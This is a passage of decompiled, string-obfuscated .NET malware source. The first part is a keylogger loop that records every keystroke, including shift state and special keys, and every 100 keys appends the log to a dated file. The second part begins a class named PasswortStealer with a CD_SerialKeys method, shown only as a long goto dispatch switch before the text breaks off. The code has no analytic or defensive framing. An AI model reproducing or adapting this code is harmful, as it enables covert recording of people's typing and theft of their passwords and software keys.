					if (num == 192)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("÷")) : (text + GClass0.smethod_0("×")));
					}
					if (num == 65)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("`")) : (text + GClass0.smethod_0("@")));
					}
					if (num == 66)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("c")) : (text + GClass0.smethod_0("C")));
					}
					if (num == 67)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("b")) : (text + GClass0.smethod_0("B")));
					}
					if (num == 68)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("e")) : (text + GClass0.smethod_0("E")));
					}
					if (num == 69)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("d")) : (text + GClass0.smethod_0("D")));
					}
					if (num == 70)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("g")) : (text + GClass0.smethod_0("G")));
					}
					if (num == 71)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("f")) : (text + GClass0.smethod_0("F")));
					}
					if (num == 72)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("i")) : (text + GClass0.smethod_0("I")));
					}
					if (num == 73)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("h")) : (text + GClass0.smethod_0("H")));
					}
					if (num == 74)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("k")) : (text + GClass0.smethod_0("K")));
					}
					if (num == 75)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("j")) : (text + GClass0.smethod_0("J")));
					}
					if (num == 76)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("m")) : (text + GClass0.smethod_0("M")));
					}
					if (num == 77)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("l")) : (text + GClass0.smethod_0("L")));
					}
					if (num == 78)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("o")) : (text + GClass0.smethod_0("O")));
					}
					if (num == 79)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("n")) : (text + GClass0.smethod_0("N")));
					}
					if (num == 80)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("q")) : (text + GClass0.smethod_0("Q")));
					}
					if (num == 81)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("p")) : (text + GClass0.smethod_0("P")));
					}
					if (num == 82)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("s")) : (text + GClass0.smethod_0("S")));
					}
					if (num == 83)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("r")) : (text + GClass0.smethod_0("R")));
					}
					if (num == 84)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("u")) : (text + GClass0.smethod_0("U")));
					}
					if (num == 85)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("t")) : (text + GClass0.smethod_0("T")));
					}
					if (num == 86)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("w")) : (text + GClass0.smethod_0("W")));
					}
					if (num == 87)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("v")) : (text + GClass0.smethod_0("V")));
					}
					if (num == 88)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("y")) : (text + GClass0.smethod_0("Y")));
					}
					if (num == 89)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("x")) : (text + GClass0.smethod_0("X")));
					}
					if (num == 90)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("{")) : (text + GClass0.smethod_0("[")));
					}
					if (num == 32)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("!")) : (text + GClass0.smethod_0("!")));
					}
					if (num == 13)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0(")œɂ\u0368ѱաٱݟ\u0821")) : (text + GClass0.smethod_0(")œɂ\u0368ѱաٱݟ\u0821")));
					}
					if (num == 219)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("Þ")) : (text + GClass0.smethod_0(">")));
					}
					if (num == 49)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("0")) : (text + GClass0.smethod_0(" ")));
					}
					if (num == 50)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("3")) : (text + GClass0.smethod_0("#")));
					}
					if (num == 51)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("2")) : (text + GClass0.smethod_0("¦")));
					}
					if (num == 52)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("5")) : (text + GClass0.smethod_0("%")));
					}
					if (num == 53)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("4")) : (text + GClass0.smethod_0("$")));
					}
					if (num == 54)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("7")) : (text + GClass0.smethod_0("'")));
					}
					if (num == 55)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("6")) : (text + GClass0.smethod_0(".")));
					}
					if (num == 56)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("9")) : (text + GClass0.smethod_0(")")));
					}
					if (num == 57)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("8")) : (text + GClass0.smethod_0("(")));
					}
					if (num == 48)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("1")) : (text + GClass0.smethod_0("<")));
					}
					if (num == 191)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("\"")) : (text + GClass0.smethod_0("&")));
					}
					if (num == 190)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("/")) : (text + GClass0.smethod_0(";")));
					}
					if (num == 188)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("-")) : (text + GClass0.smethod_0(":")));
					}
					if (num == 97)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("0")) : (text + GClass0.smethod_0("")));
					}
					if (num == 98)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("3")) : (text + GClass0.smethod_0("")));
					}
					if (num == 99)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("2")) : (text + GClass0.smethod_0("")));
					}
					if (num == 100)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("5")) : (text + GClass0.smethod_0("")));
					}
					if (num == 101)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("4")) : (text + GClass0.smethod_0("")));
					}
					if (num == 102)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("7")) : (text + GClass0.smethod_0("")));
					}
					if (num == 103)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("6")) : (text + GClass0.smethod_0("")));
					}
					if (num == 104)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("9")) : (text + GClass0.smethod_0("")));
					}
					if (num == 105)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("8")) : (text + GClass0.smethod_0("")));
					}
					if (num == 9)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^Őɢ\u0360ќ")) : (text + GClass0.smethod_0("^Őɢ\u0360ќ")));
					}
					if (num == 8)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("Pňɨ\u036bѬյٵݥࡠ१ੜ")) : (text + GClass0.smethod_0("Pňɨ\u036bѬյٵݥࡠ१ੜ")));
					}
					if (num == 220)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("±")) : (text + GClass0.smethod_0("_")));
					}
					if (num == 40)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("IŁɶ\u036aѧաٸݪ\u0879ॽ੭ଧ\u0c73൫\u0e70ས\u106cᅜ")) : (text + GClass0.smethod_0("IŁɶ\u036aѧաٸݪ\u0879ॽ੭ଧ\u0c73൫\u0e70ས\u106cᅜ")));
					}
					if (num == 37)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("IŁɶ\u036aѧաٸݪ\u0879ॽ੭ଧ౪൬\u0e6aཨ\u1071ᅜ")) : (text + GClass0.smethod_0("IŁɶ\u036aѧաٸݪ\u0879ॽ੭ଧ౪൬\u0e6aཨ\u1071ᅜ")));
					}
					if (num == 39)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("Hłɷ\u0375Ѧբٹݭ\u0878ॾ੬ନ\u0c75\u0d63\u0e66ཬၷᅱቜ")) : (text + GClass0.smethod_0("Hłɷ\u0375Ѧբٹݭ\u0878ॾ੬ନ\u0c75\u0d63\u0e66ཬၷᅱቜ")));
					}
					if (num == 38)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("Jŀɩ\u036bѤՠٿݫ\u087aॼ\u0a62ଦ౪൦\u0e66ཬၜ")) : (text + GClass0.smethod_0("Jŀɩ\u036bѤՠٿݫ\u087aॼ\u0a62ଦ౪൦\u0e66ཬၜ")));
					}
					if (num == 27)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^Łɐ\u0341ќ")) : (text + GClass0.smethod_0("^Łɐ\u0341ќ")));
					}
					if (num == 112)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_Ņȳ\u035c")) : (text + GClass0.smethod_0("_Ņȳ\u035c")));
					}
					if (num == 113)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_ŅȰ\u035c")) : (text + GClass0.smethod_0("_ŅȰ\u035c")));
					}
					if (num == 114)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_Ņȱ\u035c")) : (text + GClass0.smethod_0("_Ņȱ\u035c")));
					}
					if (num == 115)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_Ņȶ\u035c")) : (text + GClass0.smethod_0("_Ņȶ\u035c")));
					}
					if (num == 116)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_Ņȷ\u035c")) : (text + GClass0.smethod_0("_Ņȷ\u035c")));
					}
					if (num == 117)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_Ņȴ\u035c")) : (text + GClass0.smethod_0("_Ņȴ\u035c")));
					}
					if (num == 118)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_Ņȵ\u035c")) : (text + GClass0.smethod_0("_Ņȵ\u035c")));
					}
					if (num == 119)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_ŅȺ\u035c")) : (text + GClass0.smethod_0("_ŅȺ\u035c")));
					}
					if (num == 129)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_ŅȻ\u035c")) : (text + GClass0.smethod_0("_ŅȻ\u035c")));
					}
					if (num == 121)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^łȲ\u0332ќ")) : (text + GClass0.smethod_0("^łȲ\u0332ќ")));
					}
					if (num == 122)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^łȲ\u0333ќ")) : (text + GClass0.smethod_0("^łȲ\u0333ќ")));
					}
					if (num == 123)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^łȲ\u0330ќ")) : (text + GClass0.smethod_0("^łȲ\u0330ќ")));
					}
					if (num == 164)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^ŅɯͶќ")) : (text + GClass0.smethod_0("^ŅɯͶќ")));
					}
					if (num == 17)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("\\ŇɩͰфհ\u065c")) : (text + GClass0.smethod_0("\\ŇɩͰфհ\u065c")));
					}
					if (num == 91)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("Třɤ\u0362ѯեپݻ\u0827\u0952\u0a64୷౷൧\u0e5c")) : (text + GClass0.smethod_0("Třɤ\u0362ѯեپݻ\u0827\u0952\u0a64୷౷൧\u0e5c")));
					}
					if (num == 144)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^Ŋɶ\u036fќ")) : (text + GClass0.smethod_0("^Ŋɶ\u036fќ")));
					}
					if (num == 44)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("\\łɷͱѠթ\u065c")) : (text + GClass0.smethod_0("\\łɷͱѠթ\u065c")));
					}
					if (num == 45)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("\\Ńɬ\u036aѥե\u065c")) : (text + GClass0.smethod_0("\\Ńɬ\u036aѥե\u065c")));
					}
					if (num == 145)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("]ŗɫ\u036fѮ՜")) : (text + GClass0.smethod_0("]ŗɫ\u036fѮ՜")));
					}
					if (num == 46)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("]ŀɪͷѤ՜")) : (text + GClass0.smethod_0("]ŀɪͷѤ՜")));
					}
					if (num == 146)
					{
						if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown())
						{
							text += GClass0.smethod_0("\\ŖɤͱѰէ\u065c");
						}
						else
						{
							if (num == 91)
							{
								text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("Třɤ\u0362ѯեپݻ\u0827\u0952\u0a64୷౷൧\u0e5c")) : (text + GClass0.smethod_0("Třɤ\u0362ѯեپݻ\u0827\u0952\u0a64୷౷൧\u0e5c")));
							}
							text += GClass0.smethod_0("\\ŖɤͱѰէ\u065c");
						}
					}
					checked
					{
						i++;
						if (i >= 100)
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("WŞɄ\u0358ЪՉكݏࡄ\u094eਫ਼") + Conversions.ToString(DateAndTime.get_Now().Day) + GClass0.smethod_0("/") + Conversions.ToString(DateAndTime.get_Now().Month) + GClass0.smethod_0("/") + Conversions.ToString(DateAndTime.get_Now().Year), text, true);
							text = null;
							i = 0;
						}
					}
				}
				Thread.Sleep(10);
			}
		}
	}

	public class PasswortStealer
	{
		[DebuggerNonUserCode]
		public PasswortStealer()
		{
		}

		public string CD_SerialKeys()
		{
			int try0000_dispatch = -1;
			int num = default(int);
			string text = default(string);
			int num2 = default(int);
			int num3 = default(int);
			string text2 = default(string);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						num = 1;
						text = null;
						goto IL_0005;
					case 29340:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0005;
							case 3:
								goto IL_000d;
							case 4:
								goto IL_004f;
							case 5:
							case 6:
								goto IL_00b8;
							case 7:
								goto IL_00fa;
							case 8:
							case 9:
								goto IL_0163;
							case 10:
								goto IL_01a6;
							case 11:
							case 12:
								goto IL_0210;
							case 13:
								goto IL_0253;
							case 14:
							case 15:
								goto IL_02bd;
							case 16:
								goto IL_0300;
							case 17:
							case 18:
								goto IL_036a;
							case 19:
								goto IL_03ad;
							case 20:
							case 21:
								goto IL_0417;
							case 22:
								goto IL_045a;
							case 23:
							case 24:
								goto IL_04c4;
							case 25:
								goto IL_0507;
							case 26:
							case 27:
								goto IL_0571;
							case 28:
								goto IL_05b4;
							case 29:
							case 30:
								goto IL_061e;
							case 31:
								goto IL_0661;
							case 32:
							case 33:
								goto IL_06cb;
							case 34:
								goto IL_070e;
							case 35:
							case 36:
								goto IL_0778;
							case 37:
								goto IL_07a8;
							case 38:
							case 39:
								goto IL_07ff;
							case 40:
								goto IL_082f;
							case 41:
							case 42:
								goto IL_0886;
							case 43:
								goto IL_08b6;
							case 44:
							case 45:
								goto IL_090d;
							case 46:
								goto IL_093d;
							case 47:
							case 48:
								goto IL_0994;
							case 49:
								goto IL_09c4;
							case 50:
							case 51:
								goto IL_0a1b;
							case 52:
								goto IL_0a4b;
							case 53:
							case 54:
								goto IL_0aa2;
							case 55:
								goto IL_0ad2;
							case 56:
							case 57:
								goto IL_0b29;
							case 58:
								goto IL_0b59;
							case 59:
							case 60:
								goto IL_0bb0;
							case 61:
								goto IL_0be0;
							case 62:
							case 63:
								goto IL_0c37;
							case 64:
								goto IL_0c67;
							case 65:
							case 66:
								goto IL_0cbe;
							case 67:
								goto IL_0cee;
							case 68:
							case 69:
								goto IL_0d45;
							case 70:
								goto IL_0d75;
							case 71:
							case 72:
								goto IL_0dcc;
							case 73:
								goto IL_0dfc;
							case 74:
							case 75:
								goto IL_0e53;
							case 76:
								goto IL_0e83;
							case 77:
							case 78:
								goto IL_0eda;
							case 79:
								goto IL_0f0a;
							case 80:
							case 81:
								goto IL_0f61;
							case 82:
								goto IL_0f91;
							case 83:
							case 84:
								goto IL_0fe8;
							case 85:
								goto IL_1018;
							case 86:
							case 87:
								goto IL_106f;
							case 88:
								goto IL_109f;
							case 89:
							case 90:
								goto IL_10f6;
							case 91:
								goto IL_1126;
							case 92:
							case 93:
								goto IL_117d;
							case 94:
								goto IL_11ad;
							case 95:
							case 96:
								goto IL_1204;
							case 97:
								goto IL_1234;
							case 98:
							case 99:
								goto IL_128b;
							case 100:
								goto IL_12bb;
							case 101:
							case 102:
								goto IL_1312;
							case 103:
								goto IL_1342;
							case 104:
							case 105:
								goto IL_1399;
							case 106:
								goto IL_13c9;
							case 107:
							case 108:
								goto IL_1420;
							case 109:
								goto IL_1450;
							case 110:
							case 111:
								goto IL_14a7;
							case 112:
								goto IL_14d7;
							case 113:
							case 114:
								goto IL_152e;
							case 115:
								goto IL_155e;
							case 116:
							case 117:
								goto IL_15b5;
							case 118:
								goto IL_15e5;
							case 119:
							case 120:
								goto IL_163c;
							case 121:
								goto IL_166c;
							case 122:
							case 123:
								goto IL_16c3;
							case 124:
								goto IL_16f3;
							case 125:
							case 126:
								goto IL_174a;
							case 127:
								goto IL_177a;
							case 128:
							case 129:
								goto IL_17d1;
							case 130:
								goto IL_1804;
							case 131:
							case 132:
								goto IL_185e;
							case 133:
								goto IL_1891;
							case 134:
							case 135:
								goto IL_18eb;
							case 136:
								goto IL_191e;
							case 137:
							case 138:
								goto IL_1978;
							case 139:
								goto IL_19ab;
							case 140:
							case 141:
								goto IL_1a05;
							case 142:
								goto IL_1a38;
							case 143:
							case 144:
								goto IL_1a92;
							case 145:
								goto IL_1ac5;
							case 146:
							case 147:
								goto IL_1b1f;
							case 148:
								goto IL_1b52;
							case 149:
							case 150:
								goto IL_1bac;
							case 151:
								goto IL_1bdf;
							case 152:
							case 153:
								goto IL_1c39;
							case 154:
								goto IL_1c6c;
							case 155:
							case 156:
								goto IL_1cc6;
							case 157:
								goto IL_1cf9;
							case 158:
							case 159:
								goto IL_1d53;
							case 160:
								goto IL_1d86;
							case 161:
							case 162:
								goto IL_1de0;
							case 163:
								goto IL_1e13;
							case 164:
							case 165:
								goto IL_1e6d;
							case 166:
								goto IL_1ea0;
							case 167:
							case 168:
								goto IL_1efa;
							case 169:
								goto IL_1f2d;
							case 170:
							case 171:
								goto IL_1f87;
							case 172:
								goto IL_1fba;
							case 173:
							case 174:
								goto IL_2014;
							case 175:
								goto IL_2047;
							case 176:
							case 177:
								goto IL_20a1;
							case 178:
								goto IL_20d4;
							case 179:
							case 180:
								goto IL_212e;
							case 181:
								goto IL_2161;
							case 182:
							case 183:
								goto IL_21bb;
							case 184:
								goto IL_21ee;
							case 185:
							case 186:
								goto IL_2248;
							case 187:
								goto IL_227b;
							case 188:
							case 189:
								goto IL_22d5;
							case 190:
								goto IL_2308;
							case 191:
							case 192:
								goto IL_2362;
							case 193:
								goto IL_2395;
							case 194:
							case 195:
								goto IL_23ef;
							case 196:
								goto IL_2422;
							case 197:
							case 198:
								goto IL_247c;
							case 199:
								goto IL_24af;
							case 200:
							case 201:
								goto IL_2509;
							case 202:
								goto IL_253c;
							case 203:
							case 204:
								goto IL_2596;
							case 205:
								goto IL_25c9;
							case 206:
							case 207:
								goto IL_2623;
							case 208:
								goto IL_2656;
							case 209:
							case 210:
								goto IL_26b0;
							case 211:
								goto IL_26e3;
							case 212:
							case 213:
								goto IL_273d;
							case 214:
								goto IL_2770;
							case 215:
							case 216:
								goto IL_27ca;
							case 217:
								goto IL_27fd;
							case 218:
							case 219:
								goto IL_2857;
							case 220:
								goto IL_288a;
							case 221:
							case 222:
								goto IL_28e4;
							case 223:
								goto IL_2917;
							case 224:
							case 225:
								goto IL_2971;
							case 226:
								goto IL_29a4;
							case 227:
							case 228:
								goto IL_29fe;
							case 229:
								goto IL_2a31;
							case 230:
							case 231:
								goto IL_2a8b;
							case 232:
								goto IL_2abe;
							case 233:
							case 234:
								goto IL_2b18;
							case 235:
								goto IL_2b4b;
							case 236:
							case 237:
								goto IL_2ba5;
							case 238:
								goto IL_2bd8;
							case 239:
							case 240:
								goto IL_2c32;
							case 241:
								goto IL_2c65;
							case 242:
							case 243:
								goto IL_2cbf;
							case 244:
								goto IL_2cf2;
							case 245:
							case 246:
								goto IL_2d4c;
							case 247:
								goto IL_2d7f;
							case 248:
							case 249:
								goto IL_2dd9;
							case 250:
								goto IL_2e0c;
							case 251:
							case 252:
								goto IL_2e66;
							case 253:
								goto IL_2e99;
							case 254:
							case 255:
								goto IL_2ef3;
							case 256:
								goto IL_2f26;
							case 257:
							case 258:
								goto IL_2f80;
							case 259:
								goto IL_2fb3;
							case 260:
							case 261:
								goto IL_300d;
							case 262:
								goto IL_3040;
							case 263:
							case 264:
								goto IL_309a;
							case 265:
								goto IL_30cd;
							case 266:
							case 267:
								goto IL_3127;
							case 268:
								goto IL_315a;
							case 269:
							case 270:
								goto IL_31b4;
							case 271:
								goto IL_31e7;
							case 272:
							case 273:
								goto IL_3241;
							case 274:
								goto IL_3274;
							case 275:
							case 276:
								goto IL_32ce;
							case 277:
								goto IL_3301;
							case 278:
							case 279:
								goto IL_335b;
							case 280:
								goto IL_338e;
							case 281:
							case 282:
								goto IL_33e8;
							case 283:
								goto IL_341b;
							case 284:
							case 285:
								goto IL_3475;
							case 286:
								goto IL_34a8;
							case 287:
							case 288:
								goto IL_3502;
							case 289:
								goto IL_3535;
							case 290:
							case 291:
								goto IL_358f;
							case 292:
								goto IL_35c2;
							case 293:
							case 294:
								goto IL_361c;
							case 295:
								goto IL_364f;
							case 296:
							case 297:
								goto IL_36a9;
							case 298:
								goto IL_36dc;
							case 299:
							case 300:
								goto IL_3736;
							case 301:
								goto IL_3769;
							case 302:
							case 303:
								goto IL_37c3;
							case 304:
								goto IL_37f6;
							case 305:
							case 306:
								goto IL_3850;
							case 307:
								goto IL_3883;
							case 308:
							case 309:
								goto IL_38dd;
							case 310:
								goto IL_3910;
							case 311:
							case 312:
								goto IL_396a;
							case 313:
								goto IL_399d;
							case 314:
							case 315:
								goto IL_39f7;
							case 316:
								goto IL_3a2a;
							case 317:
							case 318:
								goto IL_3a84;
							case 319:
								goto IL_3ab7;
							case 320:
							case 321:
								goto IL_3b11;
							case 322:
								goto IL_3b44;
							case 323:
							case 324:
								goto IL_3b9e;
							case 325:
								goto IL_3bd1;
							case 326:
							case 327:
								goto IL_3c2b;
							case 328:
								goto IL_3c5e;
							case 329:
							case 330:
								goto IL_3cb8;
							case 331:
								goto IL_3ceb;
							case 332:
							case 333:
								goto IL_3d45;
							case 334:
								goto IL_3d78;
							case 335:
							case 336:
								goto IL_3dd2;
							case 337:
								goto IL_3e05;
							case 338:
							case 339:
								goto IL_3e5f;
							case 340:
								goto IL_3e92;
							case 341:
							case 342:
								goto IL_3eec;
							case 343:
								goto IL_3f1f;
							case 344:
							case 345:
								goto IL_3f79;
							case 346:
								goto IL_3fac;
							case 347:
							case 348:
								goto IL_4006;
							case 349:
								goto IL_4039;
							case 350:
							case 351:
								goto IL_4093;
							case 352:
								goto IL_40c6;
							case 353:
							case 354:
								goto IL_4120;
							case 355:
								goto IL_4153;
							case 356:
							case 357:
								goto IL_41ad;
							case 358:
								goto IL_41e0;
							case 359:
							case 360:
								goto IL_423a;
							case 361:
								goto IL_426d;
							case 362:
							case 363:
								goto IL_42c7;
							case 364:
								goto IL_42fa;
							case 365:
							case 366:
								goto IL_4354;
							case 367:
								goto IL_4387;
							case 368:
							case 369:
								goto IL_43e1;
							case 370:
								goto IL_4414;
							case 371:
							case 372:
								goto IL_446e;
							case 373:
								goto IL_44a1;
							case 374:
							case 375:
								goto IL_44fb;
							case 376:
								goto IL_452e;
							case 377:
							case 378:
								goto IL_4588;
							case 379:
								goto IL_45bb;
							case 380:
							case 381:
								goto IL_4615;
							case 382:
								goto IL_4648;
							case 383:
							case 384:
								goto IL_46a2;
							case 385:
								goto IL_46d5;
							case 386:
							case 387:
								goto IL_472f;
							case 388:
								goto IL_4762;
							case 389:
							case 390:
								goto IL_47bc;
							case 391:
								goto IL_47ef;
							case 392:
							case 393:
								goto IL_4849;
							case 394:
								goto IL_487c;
							case 395:
							case 396:
								goto IL_48d6;
							case 397:
								goto IL_4909;
							case 398:
							case 399:
								goto IL_4963;
							case 400:
								goto IL_4996;
							case 401:
							case 402:
								goto IL_49f0;
							case 403:
								goto IL_4a23;
							case 404:
							case 405:
								goto IL_4a7d;
							case 406:
								goto IL_4ab0;
							case 407:
							case 408:
								goto IL_4b0a;
							case 409:
								goto IL_4b3d;
							case 410:
							case 411:
								goto IL_4b97;
							case 412:
								goto IL_4bca;
							case 413:
							case 414:
								goto IL_4c24;
							case 415:
